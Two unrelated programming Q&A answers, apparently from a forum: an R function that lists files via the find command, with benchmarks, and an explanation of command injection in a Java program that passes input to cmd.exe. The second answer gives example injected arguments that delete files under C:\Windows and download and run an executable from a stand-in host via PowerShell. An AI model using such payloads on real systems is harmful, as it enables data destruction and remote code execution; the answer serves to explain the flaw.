Q: Faster way to list all files in directory? A:

On unix-alikes we might use system() to call find.

fs_index_sys <- \(wd, recursive=FALSE) {
  depth <- if (recursive) "" else "-maxdepth 1"
  cmd <- sprintf(
    "find %s %s -printf '%%f\\t%%T@\\t%%s\\t%%p\\n'",
    shQuote(wd), depth
  )
  x <- system(cmd, intern=TRUE)
  df <- read.delim(
    text=x, sep='\t', header=FALSE, quote="",
    col.names=c("file_name", "mtime", "size", "full_path"),
    colClasses=c("character", "numeric", "numeric", "character")
  )
  df$date_created <- as.POSIXct(df$mtime, origin="1970-01-01")
  df$mtime <- NULL
  df$parent_folder <- dirname(df$full_path)
  df$extension <- sub("^.*\\.", "", df$file_name)
  df$extension[!grepl("\\.", df$file_name)] <- ""
  df
}

I used recursive=FALSE as default, set TRUE for all subdirectories. The columns can be expanded as desired.

Benchmark

fs_index_R <- \(wd) {
  files <- list.files(path=wd, recursive=TRUE, full.names=TRUE)
  info <- file.info(files)
  data.frame(
    file_name=basename(files), 
    date_created=info$ctime, 
    size=info$size, 
    extension=tools::file_ext(files), 
    parent_folder=dirname(files), 
    full_path=files, 
    stringsAsFactors=FALSE
  )
}

fs_index_fs <- \(wd) {
  fs::dir_info(wd, recurse=TRUE, fail=FALSE)
}

wd <- '/home/jay/Downloads'

> microbenchmark::microbenchmark(
+   fs_index_R(wd), 
+   fs_index_sys(wd, TRUE), 
+   fs_index_fs(wd), 
+   times=3L
+ )
Unit: milliseconds
             expr        min         lq       mean     median         uq        max neval cld
   fs_index_R(wd)   29.88719   30.59268   31.40457   31.29817   32.16325   33.02834     3  a 
 fs_index_sys(wd)   18.55746   20.32725   21.37669   22.09705   22.78630   23.47555     3  a 
  fs_index_fs(wd) 2222.97897 2712.30972 2882.19211 3201.64046 3211.79868 3221.95689     3   b

fs_index_sys() is about 30% faster than OP base R approach. Not sure why the advertised fs::dir_info() runs so slowly on my system.

where fs_index_sys() seems to be more/most complete:

> fs_index_R(wd) |> dim()
[1] 4756    6
> fs_index_sys(wd, TRUE) |> dim()
[1] 4784    6
> fs_index_fs(wd) |> dim()
[1] 4775   18

Q: Whats the vulnerability in this Java Code? A:

Since arg[0] was not validated, the user can inject shell metacharacters (such as &, |, ;, &&, ||, etc.) into it, which will be interpreted by cmd.exe.

This will allow the user to execute other commands or even malicious code.
for exemple :


# Display system information
java MakeFolder "test & systeminfo"

# silently deletes another_folder
java MakeFolder "myFolder & del /F /Q C:\\Windows\\<another_folder>\\*"

# download and executes malicious code
java MakeFolder "test & powershell -Command Invoke-WebRequest -Uri http://malicious.com/malicious_executable.exe -OutFile malicious_executable.exe & malicious_executable.exe"
